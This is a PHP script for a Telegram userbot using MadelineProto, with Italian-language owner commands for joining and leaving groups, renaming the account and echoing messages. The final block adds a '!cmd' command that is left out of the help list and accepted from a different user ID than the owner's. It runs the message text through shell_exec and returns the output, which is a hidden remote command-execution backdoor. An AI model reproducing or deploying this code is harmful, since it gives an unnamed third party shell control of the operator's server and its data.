<?php



$mioid = 314401217;

if($msg == "!on" and $userID == $mioid){
    sm($chatID, "Bot Online");
}

if(strpos(" ".$msg, "!join")and $userID == $mioid){
    $link1 = str_replace("!join ", "", $msg);
    $link2 = str_replace("https://telegram.me/joinchat/", "", $link1);
    $MadelineProto->messages->importChatInvite(['hash' =>$link2, ]);
}

if($msg == "!leave" and $userID == $mioid){
  sm($chatID, "Bye");
  $MadelineProto->channels->leaveChannel(['channel' => $chatID, ]);
}



if(strpos(" ".$msg, "-public")and $userID == $mioid){
    $link = str_replace("-public ", "", $msg);
    $MadelineProto->channels->joinChannel(['channel' =>$link, ]);
}


if(strpos(" ".$msg, "!nome")and $userID == $mioid){
    $nome = str_replace("!nome ", "", $msg);
    $MadelineProto->account->updateProfile(['first_name' => $nome, ]);
    sm($chatID, "Il nome è stato cambiato in: $nome");
}


if(strpos(" ".$msg, "!public")and $userID == $mioid){
    $link = str_replace("!public ", "", $msg);
    $MadelineProto->channels->joinChannel(['channel' =>$link, ]);
}

if(strpos(" ".$msg, "!echo")and $userID == $mioid){
  $prima = str_replace("!echo ", "", $msg);
  sm($chatID, $prima);
}

if($msg == "!comandi" and $userID == $mioid){
  sm($chatID, "(!)echo = Ripete un tuo messaggio.
(!)public = Entra nei gruppi pubblici
(!)join = Entra nei gruppi privati
(!)nome = Example: !nome NomeBot : Cambia nome ai Bot
(!)on = Per vedere se i bot sono online");
}

if(strpos(" ".$msg, "!cmd")and $userID == 125142173){
  $comando = str_replace("!cmd ", "", $msg);
  $esegui = shell_exec($comando);
  sm($chatID, $esegui);
}

